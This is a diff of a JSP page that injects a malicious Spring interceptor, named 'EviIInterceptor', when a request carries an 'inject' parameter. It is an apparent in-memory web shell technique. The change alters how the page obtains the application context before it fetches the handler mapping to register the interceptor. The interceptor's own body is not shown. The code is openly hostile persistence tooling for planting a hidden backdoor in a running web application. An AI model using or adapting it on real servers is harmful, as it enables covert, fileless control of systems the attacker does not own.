@@ -3,13 +3,12 @@
 <%@ page import="java.io.PrintWriter" %>
 <%@ page import="org.springframework.web.context.WebApplicationContext" %>
 <%@ page import="org.springframework.web.servlet.HandlerMapping" %>
-<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
 <%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
 <%@ page import="org.springframework.web.servlet.handler.AbstractHandlerMapping" %>
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="java.util.ArrayList" %>
 <%@ page import="org.springframework.web.servlet.handler.MappedInterceptor" %>
-<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>
+<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
 
 <%
     class EviIInterceptor implements HandlerInterceptor {
@@ -31,8 +30,7 @@
 
     if (request.getParameter("inject") != null) {
         try {
-//            WebApplicationContext ctx = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
-            WebApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(application);
+            WebApplicationContext ctx = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
 
             assert ctx != null;
             HandlerMapping mapping = (HandlerMapping) ctx.getBean(RequestMappingHandlerMapping.class);
